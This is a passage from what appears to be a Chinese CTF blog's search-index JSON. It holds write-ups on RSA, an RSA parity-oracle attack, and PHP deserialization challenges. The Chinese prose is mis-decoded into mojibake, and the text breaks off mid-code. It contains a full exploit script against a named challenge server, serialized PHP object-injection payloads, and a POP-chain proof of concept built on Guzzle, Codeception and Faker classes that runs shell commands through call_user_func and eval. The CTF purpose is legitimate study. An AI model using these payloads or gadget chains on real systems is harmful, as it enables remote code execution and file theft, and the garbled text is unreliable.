æ•°på’Œqï¼Œå¹¶è®¡ç®—\n2.è®¡ç®—\n3.é€‰å–ä¸€ä¸ªå°äºï¼Œä¸”ä¸äº’è´¨çš„ä¸å¤ªå°çš„æ­£æ•´æ•°e\n4.è®¡ç®—eåœ¨æ¨¡nä¸‹çš„é€†å…ƒdï¼Œå³\n5.(n, e)å°è£…ä¸ºå…¬é’¥ï¼Œ(p, q, d)å°è£…ä¸ºç§é’¥\n6.å°†å¯†æ–‡è½¬ç ä¸ºåå…­è¿›åˆ¶æ•°æ®m\n7.ï¼Œcå³ä¸ºå¯ä»¥ä¼ è¾“çš„å¯†æ–‡\nè‡³æ­¤RSAåŠ å¯†å®Œæˆ\n\nHow to DECRYPT?æœ€ç®€å•çš„æƒ…å†µï¼šå·²çŸ¥pï¼Œqï¼Œeï¼Œc\n1.è®¡ç®—\n2.è®¡ç®—é€†å…ƒ\n3.\nå³å¯å¾—åˆ°æ˜æ–‡\n\nè§£å¯†ç®—æ³•è¯æ˜åˆ†ä¸¤ç§æƒ…å†µè¯æ˜ï¼Œä¸ï¼Œ\nmä¸näº’è´¨\n\\begin{align}\nc^d&=m^{ed}\\\\\n&=m^{k\\phi(n)+1}&(mod\\ n)\\\\\n\\because ed&=1&(mod\\ \\phi(n))\\\\\n\\therefore c^d&=[m(m^{\\phi(n)}\\ (mod\\ n))^k]\\\\\n&=m&(mod\\ n)\\\\\n&=m\\\\\n\\end{align}mä¸nä¸äº’è´¨ç”±äºmä¸nä¸äº’è´¨ï¼Œæ‰€ä»¥mä¸nå¿…å®šæœ‰ä¸€ä¸ªå¤§äº1çš„å…¬å› å­ï¼Œè€Œç”±äºï¼Œä¸”pä¸qå‡ä¸ºè´¨æ•°ï¼Œæ‰€ä»¥ï¼Œ\nç”±äº\n\n\\begin{align}\nm^{ed}&=m^{k\\phi(n)+1}\\\\\n&=m^{k(p-1)(q-1)+1}\\\\\n&=m(m^{q-1}\\ (mod\\ q))^{k(p-1)}\\\\\n&=m&(mod\\ q)\\\\\n\\end{align}å³\nå‡è®¾ï¼Œåˆ™æœ‰\n\n\\begin{align}\nm^{ed}&={(cp)}^{ed}\\\\\n&=0&(mod\\ p)\\\\\n\\because m\\ mod\\ p&=0\\\\\n\\therefore tq\\ mod\\ p&=0\\\\\n\\because gcd(p,q)&=1\\\\\n\\therefore t&=rp&(t\\in N^{*})\\\\\n\\end{align}ç”±æ­¤å¯ä»¥å¾—åˆ°\n\n\\begin{align}\nm^{ed}&=(m+tq)\\\\\n&=(m+rpq)\\\\\n&=(m+rn)&(mod\\ n)\\\\\n&=m\\\\\n\\end{align}è‡³æ­¤è¯æ˜å®Œæ¯•\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"Parity_RSA äºŒåˆ†æ³•æ”»å‡»","url":"/2023/03/10/Parity/","content":"Parity_RSA[QCTF] baby_rsa\nAnalyzeå…ˆçœ‹é¢˜ï¼š\nimport socketserverfrom secret import flagimport signalfrom Crypto.Util.number import *import randomimport stringfrom hashlib import sha256table = string.ascii_letters + string.digitsmenu = b'''Give me your information and I'll tell you about the parity after decryption.Let me see your options...1.encrypt message2.get flag3.exit'''e = 0x10001p = getPrime(512)q = getPrime(512)N = p * qphi = (p - 1) * (q - 1)d = inverse(e, phi)class Task(socketserver.BaseRequestHandler):    def _recvall(self):        BUFF_SIZE = 2048        data = b''        while True:            part = self.request.recv(BUFF_SIZE)            data += part            if len(part) &lt; BUFF_SIZE:                break        return data.strip()    def send(self, msg, newline=True):        try:            if newline:                msg += b'\\n'            self.request.sendall(msg)        except:            pass    def recv(self, prompt=b'[-] '):        self.send(prompt, newline=False)        return self._recvall()    def proof_of_work(self):        proof = (''.join([random.choice(table) for _ in range(12)])).encode()        sha = sha256(proof).hexdigest().encode()        self.send(b\"[+] sha256(XXXX+\" + proof[4:] + b\") == \" + sha)        XXXX = self.recv(prompt=b'[+] Give Me XXXX :')        if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest().encode() != sha:            return False        return True    def handle(self):        print(1)        signal.alarm(2400)        if not self.proof_of_work():            self.send(b'bye~')            return        self.send(menu)        self.send(('e = ' + hex(e)).encode())        self.send(('N = ' + hex(N)).encode())        while True:            num = self.recv(prompt=b'what\\'s your choise?')            if num == b'1':                c = int(self.recv(prompt=b'the message:').decode(), 16)                m = pow(c, d, N)                if m % 2:                    self.send(b'odd...')                if m % 2 == 0:                    self.send(b'even...')            elif num == b'2':                c = pow(bytes_to_long(flag, e, N))                self.send(('c = ' + hex(c)).encode())            elif num == b'3':                self.send(b'bye~')                return            else:                return        class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer):    passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer):    passif __name__ == \"__main__\":    HOST, PORT = '0.0.0.0', 10000    server = ForkedServer((HOST, PORT), Task)    server.allow_reuse_address = True    print(HOST, PORT)    server.serve_forever()\nå…ˆncä¸€ä¸‹é¢˜ç›®æä¾›çš„ç«¯å£ï¼š\nncat scr1w.dlut.edu.cn 28088#Output:#[+] sha256(XXXX+iemdocJd) == 419017b5ab02fca75dc806b09ce4bbec1fafe03292d5e17a54551cb2d00b7f40#[+] Give Me XXXX :\nç®€å•çš„sha256çˆ†ç ´ï¼š\nfrom pwn import *from hashlib import sha256from gmpy2 import *def break_sha(last, shav):    s = string.ascii_letters + string.digits    for v1 in s:        for v2 in s:            for v3 in s:                for v4 in s:                    t = (v1 + v2 + v3 + v4).encode() + last                    if sha256(t).hexdigest() == shav:                        return (v1 + v2 + v3 + v4).encode()s1=b'iemdocJd's2=b'ee2571d3f23fb615fdbe01cea04a20352920f0b02c65e06fc14aa71cb20067e1'print(break_sha(s1,s2.decode()))\n#Output:#Give me your information and I'll tell you about the parity after decryption.#Let me see your options...#1.encrypt message#2.get flag#3.exit##e = 0x10001#N = #0xab068236ae895f50991b85a495b05cab628f23408c6847aa19cb91e6b22e5b1a4e67d1c99b36f53da55230a26b496cb60a5092c728a24ffc0e5a195a456481f1e4c82512af6b8003e092045aa0b3dc79c4d12beea95729e6c1fce16215e0ef47d77bb3dc7417006a16af9b88841627c4462608af4e6d4fa8f369d126cf8bbad9#what's your choise?#Input:#2#Output:#c = 0x5fff63ca6bbf96b571128a2502bee3de7be1be0cb84e6f70c2750aaf174475335e0cb59a54a2811154b2c76dd01a2a05660b5485efbfc956d05f254b9fbac53644eea31ea59cc8a8782b4618558aeff0129d85d24dbc0adf431d0929a26803035cff7a2cbc7da52c4dee682078d46e15c2849898fa3defbc700c5878314ae646\né€šè¿‡è¾“å…¥ä¸€ä¸ªåŠ å¯†çš„å¯†æ–‡ï¼ŒæœåŠ¡å™¨ä¼šå‘Šè¯‰ä½ ç”¨ç§é’¥dè§£å¯†è¯¥å¯†æ–‡åï¼Œæ‰€å¾—çš„æ˜æ–‡ç»“æœæ˜¯evenè¿˜æ˜¯oddï¼Œé€šè¿‡è¿™ç§æœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘æœåŠ¡å™¨ä¼ å…¥çš„å€¼è¿›è¡Œä¸€äº›ä¿®æ”¹æ“ä½œï¼Œæˆ‘ä»¬ä¼ å…¥$2e^{c}å³ä¸º(2m)^{e}ï¼Œè€ŒæœåŠ¡å™¨ä¼šå°†(2m)^eè§£å¯†æˆ2måå‘Šè¯‰æˆ‘ä»¬å…¶æ¨¡ä¸‹çš„å¥‡å¶æ€§ã€‚2^{e}cå³ä¸º(2m)^{e}ï¼Œè€ŒæœåŠ¡å™¨ä¼šå°†(2m)^{e}è§£å¯†æˆ2måå‘Šè¯‰æˆ‘ä»¬å…¶æ¨¡ä¸‹çš„å¥‡å¶æ€§ã€‚2^{e}å³ä¸º(2m)^{e}ï¼Œè€ŒæœåŠ¡å™¨ä¼šå°†(2m)^{e}è§£å¯†æˆ2m$åå‘Šè¯‰æˆ‘ä»¬å…¶æ¨¡ä¸‹çš„å¥‡å¶æ€§ã€‚\næˆ‘ä»¬çŸ¥é“ä»»æ„ä¸€ä¸ªè‡ªç„¶æ•°,å…¶ä¸çš„ä¹˜ç§¯ä¸€å®šä¸ºå¶æ•°ï¼Œæ‰€ä»¥åœ¨ä¸‹ï¼š\nè‹¥ï¼Œå³è§£å¯†åçš„ä¼ å…¥å‚æ•°æ²¡æœ‰ç»è¿‡å–æ¨¡æ“ä½œçš„è¯,é‚£ä¹ˆå…¶å¥‡å¶æ€§ä¸€å®šä¸ºevenï¼Œå› ä¸ºä¸ºå¶æ•°\nè‹¥ï¼Œå³è§£å¯†åçš„ä¼ å…¥å‚æ•°ç»è¿‡äº†å–æ¨¡æ“ä½œï¼Œé‚£ä¹ˆå…¶å¥‡å¶æ€§ä¸€å®šä¸ºoddï¼Œå› ä¸ºä¸ºå¶æ•°ï¼Œä¸ºå¥‡æ•°\næ ¹æ®ä¸Šé¢ä¸¤ç‚¹æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»¥ä¸‹ç»“è®ºï¼š\nè‹¥è¿”å›evenï¼Œåˆ™\nè‹¥è¿”å›oddï¼Œå³\né€šè¿‡è¿”å›çš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥å°†æ˜æ–‡æ‰€åœ¨çš„ç¼©å°åˆ°åŸæ¥èŒƒå›´çš„ï¼Œè‹¥æˆ‘ä»¬ç»§ç»­ä¼ å…¥ï¼Œåˆ™å¯å°†èŒƒå›´å†æ¬¡ç¼©å°\nå¦‚æ­¤è¿›è¡Œä¸‹å»ï¼Œæˆ‘ä»¬åªéœ€è¦æ¬¡å³å¯å¾—åˆ°\n\nEXPfrom pwn import *from hashlib import sha256from gmpy2 import *from Crypto.Util.number import *e = 0x10001n = 0x93022347fcf4a51c3a62dc83e93f4dc91dc6331b5541cd912fd7e0891a8419ce77fce50220cff791d9d7ca4f3af19531a3358a0301f85f284441a4ea9b38c84aa7901a11c9f6a5d6305933635294197d2f6cd63f9649ca9669a766e7f802a668d9b265d30fe8b657d369919ad278c52de26fac04e42f750999cce7dd6eb75a0fc = 0xec722e27f20c32794072fa699c7a657bee39134accd623166c785a8e44f22a5523274f68eda3c75a5117ddc9cc13fcfd611a4971530a6e6bf166b3cfdf7e92fd943c17d8b25990bfe24bc7718232789e4e2126b08d7117b4c90aa0702ef83d9cf98583f02c819676535e60c84f918dec8cd57a39dbf2d5a62924339cc00f665def break_sha(last, shav):    s = string.ascii_letters + string.digits    for v1 in s:        for v2 in s:            for v3 in s:                for v4 in s:                    t = (v1 + v2 + v3 + v4).encode() + last                    if sha256(t).hexdigest() == shav:                        return (v1 + v2 + v3 + v4).encode()ldata=0rdata=nnum=0io = remote(\"scr1w.dlut.edu.cn\", 28092)io.recvuntil(b'sha256(XXXX+')str1 = io.recvuntil(b')', drop=True)print(str1)io.recvuntil(b'== ')str2 = io.recvuntil(b'\\n', drop=True)print(str2)res = break_sha(str1, str2.decode())print(res)io.recvuntil(b'[+] Give Me XXXX :')io.sendline(res)while rdata-ldata&gt;2:    num+=1    t=powmod(2,num*e,n)    data=hex((c*t)%n)[2:]    io.recvuntil(b\"what's your choise?\")    io.sendline(b'1')    # io.recvuntil(b'the message:')    io.recv()    io.sendline(data)    ans=io.recvline()    print(ans)    if ans==b'odd...\\n':        ldata = (ldata + rdata) // 2 if (ldata + rdata) % 2 == 0 else (ldata + rdata) // 2 + 1    elif ans==b'even...\\n':        rdata = (ldata + rdata) // 2 if (ldata + rdata) % 2 == 0 else (ldata + rdata) // 2 + 1    print(rdata-ldata)    # print(ldata,rdata)# while powmod(ldata,e,n)!=c:#     ldata-=1print(\"l=\",ldata)print(\"r=\",rdata)print(long_to_bytes(ldata))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"PHPååºåˆ—åŒ–-[QWB 2021]","url":"/2023/03/12/easy-pop/","content":"easy_pop ([QWB 2021] - èµŒå¾’)Analyzeè¿›ä¸€ä¸‹ç«¯å£ï¼Œåªå¾—åˆ°I think you need /etc/hint . Before this you need to see the source codeï¼Œä¸‹è½½ä¸€ä¸‹å¤‡ä»½æ–‡ä»¶/www.zipï¼Œå¾—åˆ°index.php\n#index.php&lt;meta charset=\"utf-8\"&gt;&lt;?php//hint is in hint.phperror_reporting(1);class Start{    public $name='guest';    public $flag='syst3m(\"cat 127.0.0.1/etc/hint\");';\t    public function __construct(){        echo \"I think you need /etc/hint . Before this you need to see the source code\";    }    public function _sayhello(){        echo $this-&gt;name;        return 'ok';    }    public function __wakeup(){        echo \"hi\";        $this-&gt;_sayhello();    }    public function __get($cc){        echo \"give you flag : \".$this-&gt;flag;        return ;    }}class Info{    private $phonenumber=123123;    public $promise='I do';\t    public function __construct(){        $this-&gt;promise='I will not !!!!';        return $this-&gt;promise;    }    public function __toString(){        return $this-&gt;file['filename']-&gt;ffiillee['ffiilleennaammee'];    }}class Room{    public $filename='/flag';    public $sth_to_set;    public $a='';\t    public function __get($name){        $function = $this-&gt;a;        return $function();    }\t    public function Get_hint($file){        $hint=base64_encode(file_get_contents($file));        echo $hint;        return ;    }    public function __invoke(){        $content = $this-&gt;Get_hint($this-&gt;filename);        echo $content;    }}if(isset($_GET['hello'])){    unserialize($_GET['hello']);}else{    $hi = new  Start();}?&gt;\nä»ä»£ç ä¸­åˆ†æå¯ä»¥çœ‹å‡ºï¼Œç»™helloä¼ å‚ï¼Œç„¶åè¿›è¡Œåºåˆ—åŒ–æ”»å‡»ã€‚é€šè¿‡å¯¹é­”æœ¯æ–¹æ³•å’Œåºåˆ—åŒ–çš„çš„å­¦ä¹ ï¼Œæˆ‘ä»¬åªèƒ½ä»Startè¿™ä¸ªç±»å¼€å§‹ä¸‹æ‰‹ï¼Œå½“å¯¹è¿™ä¸ªè¯¥ç±»è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œwakeup()æ–¹æ³•ï¼Œè€Œè¿™3ä¸ªç±»ä¸­åªæœ‰Startç±»å­˜åœ¨è¿™ä¸ªæ–¹æ³•ã€‚å†ç»§ç»­è§‚å¯Ÿå‘ç°ï¼Œæˆ‘ä»¬æœ€ç»ˆéœ€è¦è¾¾åˆ°çš„ç›®çš„åœ°æ˜¯Roomç±»çš„Get_hint()æ–¹æ³•ã€‚\næ‰€ä»¥å¯ä»¥æ„é€ payloadï¼š\n&lt;?phpinclude \"index.php\";$a = new Start();\t\t\t// __wakeup()è¿›å…¥ï¼Œ$a-&gt;name = new Info();\t\t// Infoçš„__toString()è¿›å…¥$a-&gt;name-&gt;file[\"filename\"] = new Room();\t// Roomçš„__get()è¿›å…¥$a-&gt;name-&gt;file[\"filename\"]-&gt;a= new Room();\t// Roomçš„__invoke()è¿›å…¥echo \"&lt;br&gt;\";echo serialize($a);?&gt;\nåºåˆ—åŒ–åå¯ä»¥å¾—åˆ°O:5:\"Start\":2:{s:4:\"name\";O:4:\"Info\":3:{s:17:\"Infophonenumber\";i:123123;s:7:\"promise\";s:15:\"I will not !!!!\";s:4:\"file\";a:1:{s:8:\"filename\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";s:0:\"\";}}}}s:4:\"flag\";s:33:\"syst3m(\"cat 127.0.0.1/etc/hint\");\";}\nååºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸€ç‰‡ç©ºç™½ï¼Œå†ä»”ç»†æŸ¥çœ‹payloadå‘ç°æ˜¯Infophonenumberå‡ºç°äº†é—®é¢˜ï¼Œæ·»åŠ ä¸Š%00å³å¯\nå®Œæ•´payloadï¼š/?hello=O:5:\"Start\":2:{s:4:\"name\";O:4:\"Info\":3:{s:17:\"%00Infop%00honenumber\";i:123123;s:7:\"promise\";s:15:\"I will not !!!!\";s:4:\"file\";a:1:{s:8:\"filename\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";s:0:\"\";}}}}s:4:\"flag\";s:33:\"syst3m(\"cat 127.0.0.1/etc/hint\");\";}\nå°†å¾—åˆ°çš„ç»“æœBase64è§£ç åå³å¯å¾—åˆ°flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"Advanced_RSA","url":"/2023/03/23/Advanced-RSA/","content":"RSAè¿›é˜¶Tools\nåˆ†è§£å¤§è´¨æ•°\n\nFactordb ï¼ˆhttp://www.factordb.comï¼‰\n\nyafu ï¼ˆé€‚ç”¨äºpï¼Œqç›¸å·®è¿‡å¤§æˆ–è¿‡å°çš„æƒ…å†µï¼‰\n\n\n\n\nâ€‹                https://sourceforge.net/projects/yafu/\nâ€‹                ä¸‹è½½ååœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œ.\\yafu-x64.exe â€œfactor(6)â€æˆ–.\\yafu-x64.exe â€œfactor(@)â€ -batchfile data.txtå³å¯\nâ€‹    \n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"PHPååºåˆ—åŒ–-[ç¥¥äº‘æ¯2021 ez_yii]","url":"/2023/03/22/ez-yii/","content":"ez_yii [ç¥¥äº‘æ¯2021]Analyzeå…ˆä¸Šé¢˜\nindex.php\n&lt;?phpinclude(\"closure/autoload.php\");function myloader($class){    require_once './class/' . (str_replace('\\\\', '/', $class) . '.php');}spl_autoload_register(\"myloader\"); error_reporting(0);if($_POST['data']){    unserialize(base64_decode($_POST['data']));}else{\techo \"&lt;h1&gt;æŸiiæœ€æ–°çš„æŸæ¡é“¾å­&lt;/h1&gt;\";}\nautoload.php\n&lt;?php/* =========================================================================== * Copyright (c) 2018-2019 Zindex Software * * Licensed under the MIT License * =========================================================================== */require_once 'functions.php';spl_autoload_register(function($class){       $class = ltrim($class, '\\\\');    $dir = __DIR__ . '/src';    $namespace = 'Opis\\Closure';        if(strpos($class, $namespace) === 0)    {        $class = substr($class, strlen($namespace));        $path = '';        if(($pos = strripos($class, '\\\\')) !== FALSE)        {            $path = str_replace('\\\\', '/', substr($class, 0, $pos)) . '/';            $class = substr($class, $pos + 1);        }        $path .= str_replace('_', '/', $class) . '.php';        $dir .= '/' . $path;                if(file_exists($dir))        {            include $dir;            return true;        }                return false;    }        return false;});\nfunctions.php\n&lt;?php/* =========================================================================== * Copyright (c) 2018-2019 Zindex Software * * Licensed under the MIT License * =========================================================================== */namespace Opis\\Closure;/** * Serialize * * @param mixed $data * @return string */function serialize($data){    SerializableClosure::enterContext();    SerializableClosure::wrapClosures($data);    $data = \\serialize($data);    SerializableClosure::exitContext();    return $data;}/** * Unserialize * * @param string $data * @param array|null $options * @return mixed */function unserialize($data, array $options = null){    SerializableClosure::enterContext();    $data = ($options === null || \\PHP_MAJOR_VERSION &lt; 7)        ? \\unserialize($data)        : \\unserialize($data, $options);    SerializableClosure::unwrapClosures($data);    SerializableClosure::exitContext();    return $data;}\nRunProcess.php\n&lt;?phpnamespace Codeception\\Extension;class RunProcess{    protected $output;    protected $config = ['sleep' =&gt; 0];    protected static $events = [];    private $processes = [];    public function __destruct()#1    {        $this-&gt;stopProcess();    }    public function stopProcess()#2    {        foreach (array_reverse($this-&gt;processes) as $process) {            if (!$process-&gt;isRunning()) {                continue;            }            $this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $process-&gt;getCommandLine());            $process-&gt;stop();        }        $this-&gt;processes = [];    }}\nDefaultGenerator.php\n&lt;?phpnamespace Faker;class DefaultGenerator{    protected $default;    public function __call($method, $attributes)    {           echo \"def\";        return $this-&gt;default;    }}\nAppendStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class AppendStream{    private $streams = [];#-7    private $seekable = true;    public function __toString()    {        $this-&gt;rewind();        return \"hahaha\";    }    public function rewind()    {        $this-&gt;seek(0);    }    public function seek($offset, $whence = SEEK_SET)    {        echo\"4\";        if (!$this-&gt;seekable) {            throw new \\RuntimeException('This AppendStream is not seekable');        } elseif ($whence !== SEEK_SET) {            throw new \\RuntimeException('The AppendStream can only seek with SEEK_SET');        }        $this-&gt;pos = $this-&gt;current = 0;        // Rewind each stream        foreach ($this-&gt;streams as $i =&gt; $stream) {            try {                $stream-&gt;rewind();#-6            } catch (\\Exception $e) {                throw new \\RuntimeException('Unable to seek stream '                    . $i . ' of the AppendStream', 0, $e);            }        }    }}\nCachingStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class CachingStream{    private $remoteStream;    private $skipReadBytes = 0;    public function rewind()#-5    {        $this-&gt;seek(0);    }    public function seek($offset)#-4    {        $byte = $offset;        $diff = $byte - $this-&gt;stream-&gt;getSize();        if ($diff &gt; 0) {            // Read the remoteStream until we have read in at least the amount            // of bytes requested, or we reach the end of the file.            while ($diff &gt; 0 &amp;&amp; !$this-&gt;remoteStream-&gt;eof()) {                $this-&gt;read($diff);                $diff = $byte - $this-&gt;stream-&gt;getSize();            }        } else {            // We can just do a normal seek since we've already seen this byte.            $this-&gt;stream-&gt;seek($byte);        }    }    public function read($length)    {        // Perform a regular read on any previously read data from the buffer        $data = $this-&gt;stream-&gt;read($length);        $remaining = $length - strlen($data);        // More data was requested so read from the remote stream        if ($remaining) {            // If data was written to the buffer in a position that would have            // been filled from the remote stream, then we must skip bytes on            // the remote stream to emulate overwriting bytes from that            // position. This mimics the behavior of other PHP stream wrappers.            $remoteData = $this-&gt;remoteStream-&gt;read(#-3                $remaining + $this-&gt;skipReadBytes            );            if ($this-&gt;skipReadBytes) {                $len = strlen($remoteData);                $remoteData = substr($remoteData, $this-&gt;skipReadBytes);                $this-&gt;skipReadBytes = max(0, $this-&gt;skipReadBytes - $len);            }            $data .= $remoteData;            $this-&gt;stream-&gt;write($remoteData);        }        return $data;    }}\nPumpStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class PumpStream{    private $source;    private $size;    private $tellPos = 0;    private $metadata;    private $buffer;    public function getSize()    {        return $this-&gt;size;    }    public function read($length)#-2    {        $data = $this-&gt;buffer-&gt;read($length);        $readLen = strlen($data);        $this-&gt;tellPos += $readLen;        $remaining = $length - $readLen;        if ($remaining) {            $this-&gt;pump($remaining);            $data .= $this-&gt;buffer-&gt;read($remaining);            $this-&gt;tellPos += strlen($data) - $readLen;        }        return $data;    }    private function pump($length)#-1    {        if ($this-&gt;source) {            do {                $data = call_user_func($this-&gt;source, $length);                if ($data === false || $data === null) {                    $this-&gt;source = null;                    return;                }                $this-&gt;buffer-&gt;write($data);                $length -= strlen($data);            } while ($length &gt; 0);        }    }}\nè¿™æ¬¡çš„ä»£ç æ¯”è¾ƒå¤šï¼Œéœ€è¦è¿›è¡Œä¸€ç‚¹ç‚¹å‰–æ\nè¿›è¡Œé€†å‘åˆ†æï¼š\né¦–å…ˆè§‚å¯Ÿåˆ°åœ¨PumpStream.phpä¸­å­˜åœ¨å‡½æ•°call_user_func()ï¼Œå¯ä»¥è€ƒè™‘åˆ©ç”¨ï¼Œå¾€ä¸Šé€ä¸ªè§‚å¯Ÿï¼Œå‡½æ•°call_user_func()åœ¨å‡½æ•°pump()ä¸­ï¼Œå†æ¬¡å¾€ä¸Šï¼Œå‡½æ•°read()åœ¨if($remaining)çš„æ¡ä»¶ä¸‹ä¼šè°ƒç”¨å‡½æ•°pump()\nå…¨å±€æœç´¢å‡½æ•°read()ï¼Œåœ¨CachingStream.phpä¸­æ‰¾åˆ°äº†åŒåå‡½æ•°read()ï¼Œå¯ä»¥å°†å…¶ä½œä¸ºè·³æ¿ï¼Œè€Œåœ¨å‡½æ•°seek()ä¸­ï¼Œè°ƒç”¨äº†å‡½æ•°read()ï¼Œåˆåœ¨å‡½æ•°rewind()ä¸­è¢«è°ƒç”¨\nå†æ¬¡å…¨å±€æœç´¢å‡½æ•°rewind()ï¼Œåœ¨AppendStream.phpä¸­æ‰¾åˆ°äº†åŒåå‡½æ•°rewind()ï¼Œåˆå¯ä»¥ä½œä¸ºè·³æ¿\nè¿›è¡Œæ­£å‘åˆ†æï¼š\nåœ¨RunProcess.phpä¸­ï¼Œå‡½æ•°__destruct()è°ƒç”¨äº†å‡½æ•°stopProcess()ï¼Œå¯ä»¥è”æƒ³åˆ°ä½¿ç”¨å‡½æ•°__call()ï¼Œå‘ç°åœ¨DefaultGenerator.phpä¸­ï¼Œå‘ç°è¿˜éœ€è¦ä¸€ä¸ªå‡½æ•°__toString()ï¼Œå¯ä»¥åœ¨AppendStream.phpä¸­æ‰¾åˆ°\næ­£å‘é€†å‘åˆ†æå®Œæˆï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹POPé“¾\n// RunProcess-&gt;__destruct()-&gt;stopProcess()// -&gt;DefaultGenerator-&gt;__call()// -&gt;AppendStream-&gt;__toString()-&gt;rewind()-&gt;seek()// -&gt;CachingStream-&gt;rewind()-&gt;seek()-&gt;read()// -&gt;PumpStream-&gt;read()-&gt;pump()-&gt;call_user_func()\nPOC&lt;?php // RunProcess-&gt;__destruct()-&gt;stopProcess()// -&gt;DefaultGenerator-&gt;__call()// -&gt;AppendStream-&gt;__toString()-&gt;rewind()-&gt;seek()// -&gt;CachingStream-&gt;rewind()-&gt;seek()-&gt;read()// -&gt;PumpStream-&gt;read()-&gt;pump()-&gt;call_user_func()namespace Codeception\\Extension{    use Faker\\DefaultGenerator;    use GuzzleHttp\\Psr7\\AppendStream;    use GuzzleHttp\\Psr7\\CachingStream;    use GuzzleHttp\\Psr7\\PumpStream;    class RunProcess    {        protected $output;        private $processes = ['aaa'=&gt;1];        public function __construct($def=0)        {            echo \"runprocess~~~~~~~~~~~~~~~~~~\";            $this-&gt;output=$def;            $this-&gt;processes['aaa']=$def;                    }    }    $pum=new PumpStream;    $cac=new CachingStream($pum);    $app=new AppendStream($cac);    $def=new DefaultGenerator($app);    $run=new RunProcess($def);    $payload = serialize($run);    echo base64_encode($payload);}namespace Faker{    use GuzzleHttp\\Psr7\\AppendStream;    use GuzzleHttp\\Psr7\\CachingStream;    class DefaultGenerator    {        protected $default;        public function __construct($app=0)        {            echo \"faker~~~~~~~~~~~~~~~~~~\";            $this-&gt;default = $app;        }    }}namespace GuzzleHttp\\Psr7{    class AppendStream    {        private $streams=[];        public function __construct($cac=0)        {            echo \"appengstream~~~~~~~~~~~~~~~~~~\";            $this-&gt;streams[]=$cac;        }    }}namespace GuzzleHttp\\Psr7{    use Faker\\DefaultGenerator;    use GuzzleHttp\\Psr7\\PumpStream as Psr7PumpStream;    class CachingStream    {        private $remoteStream;        public function __construct($pum=0)        {            echo \"cachingstream~~~~~~~~~~~~~~~~~~\";            $this-&gt;stream=$pum;            $this-&gt;remoteStream=new DefaultGenerator(NULL);        }    }    class PumpStream    {        private $source;        private $size;        private $tellPos = 0;        private $metadata;        private $buffer;        public function __construct()        {            echo \"pumpstream~~~~~~~~~~~~~~~~~~\";            include(\"closure/autoload.php\");            $this-&gt;size=-1;            $def=new DefaultGenerator('aaaaaa');            $this-&gt;buffer=new CachingStream($def);            $fun=function()            {                system(\"cd / &amp;&amp; cat flag\");            };            $f=(\\Opis\\Closure\\serialize($fun));            $this-&gt;source=unserialize($f);        }    }}\nååºåˆ—åŒ–åå¯¹dataè¿›è¡ŒPOSTä¼ å‚å³å¯å¾—åˆ°flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"PHPååºåˆ—åŒ–-eval()","url":"/2023/03/13/ez_unserialize/","content":"ez_unserializeAnalyzeå…ˆä¸Šé¢˜ï¼š\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class User{    private $username='name';    private $password='password';    private $class = 'info';    public function __construct(){        $this-&gt;class=new info();    }    public function login($u,$p){        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){            echo \"successfully login\";        }    }    public function __destruct(){        $this-&gt;class-&gt;getInfo();    }}class info{    private $user='xxxxxx';    public function getInfo(){        return $this-&gt;user;    }}class evil{    private $code;    public function getInfo(){        eval($this-&gt;code);    }}$username=$_GET['username'];$password=$_GET['password'];if(isset($username) &amp;&amp; isset($password)){    $user = unserialize($_COOKIE['user']);    $user-&gt;login($username,$password);}\nå…ˆæ‰¾åˆ°ååºåˆ—åŒ–çš„åœ°æ–¹$user = unserialize($_COOKIE['user']);ï¼Œæ‰€ä»¥æ˜¯å¯¹userè¿›è¡Œcookieæ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨cookie editorç­‰æ’ä»¶\nè§‚å¯Ÿåˆ°evilç±»ä¸­æœ‰eval()å‡½æ•°ï¼Œå…¶ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²å‚æ•°å½“åšä»£ç æ¥æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œæ”»å‡»\nUserç±»çš„æ„é€ å‡½æ•°ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥åœ¨è¿™é‡Œæ”¹ä¸º$this-&gt;class=new evil();\nEXP#payload&lt;?phperror_reporting(0);// highlight_file(__FILE__);class User{    private $username='name';    private $password='password';    private $class;    public function __construct(){        $this-&gt;class=new evil();    }    public function login($u,$p){        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){            echo \"successfully login\";        }    }    public function __destruct(){        $this-&gt;class-&gt;getInfo();    }}class info{    private $user='xxxxxx';    public function getInfo(){        return $this-&gt;user;    }}class evil{    private $code=\"system('cat flag.php');\";    public function getInfo(){        eval($this-&gt;code);    }}$username=$_GET['username'];$password=$_GET['password'];if(isset($username) &amp;&amp; isset($password)){    $user = unserialize($_COOKIE['user']);    